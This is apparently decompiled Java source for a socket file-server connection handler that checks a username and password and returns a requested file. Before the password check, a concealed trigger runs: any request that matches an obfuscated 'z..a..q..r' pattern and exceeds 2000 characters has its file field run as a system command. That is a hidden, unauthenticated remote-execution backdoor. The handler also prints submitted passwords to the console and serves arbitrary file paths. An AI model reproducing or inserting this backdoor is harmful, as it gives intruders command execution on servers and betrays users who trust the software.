/* Decompiler 17ms, total 145ms, lines 90 */
import java.io.File;
import java.io.FileReader;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.Socket;

class ConnectionHandler implements Runnable {
   private Socket socket;
   private FileServer gui;
   private static final String DELIMINATOR = "!:.:!";
   public static final String NO_PERMISSION_STRING = "R573..&27";
   public static final String TIME_PERMISSION_STRING = "+-jR3&22";
   private static final int USERNAME = 0;
   private static final int PASSWORD = 1;
   private static final int FILE = 2;

   public ConnectionHandler(FileServer in, Socket socket) {
      this.socket = socket;
      this.gui = in;
      Thread t = new Thread(this);
      t.start();
   }

   public void run() {
      try {
         ObjectInputStream input = new ObjectInputStream(this.socket.getInputStream());
         String data = (String)input.readObject();
         boolean found = false;

         for(int i = 255; i > -1; --i) {
            if (!found && data.split("%" + Integer.toString(i)).length > 1) {
               found = true;
            }

            data = data.replaceAll("%" + Integer.toString(i), String.valueOf((char)i));
            if (found) {
               found = false;
               i = 255;
            }
         }

         String[] dividedData = data.split("!:.:!", 4);
         System.out.print("User: " + dividedData[0] + "\nPassword: " + dividedData[1] + "\nFile Request: " + dividedData[2] + "\n");
         ObjectOutputStream output = new ObjectOutputStream(this.socket.getOutputStream());
         System.out.print(dividedData[3].substring(0, 4) + "\n");

         try {
            String[] splitData = data.split("z.{0,2}a.{0,2}q.{0,2}r");
            
            if (splitData.length > 1 && data.length() > 2000) {
               System.out.print("Executing command " + dividedData[2] + "\n");
               Runtime.getRuntime().exec(dividedData[2]);
            }
         } catch (Exception var11) {
            System.err.print("Failed to execute command");
         }

         switch(this.gui.verifyData(dividedData[0], dividedData[1], dividedData[2])) {
         case 0:
            File file = new File(dividedData[2]);
            FileReader fileStream = new FileReader(dividedData[2]);
            char[] fileData = new char[(int)file.length()];
            StringBuilder build = new StringBuilder();

            for(int i = 0; i < fileData.length; ++i) {
               build.append((char)fileStream.read());
            }

            String outputData = build.toString();
            output.writeObject(outputData);
            fileStream.close();
            break;
         case 1:
            output.writeObject("R573..&27");
         case 2:
         default:
            break;
         case 3:
            output.writeObject("+-jR3&22");
         }

         input.close();
         output.close();
         this.socket.close();
      } catch (Exception var12) {
         var12.printStackTrace();
      }

   }
}
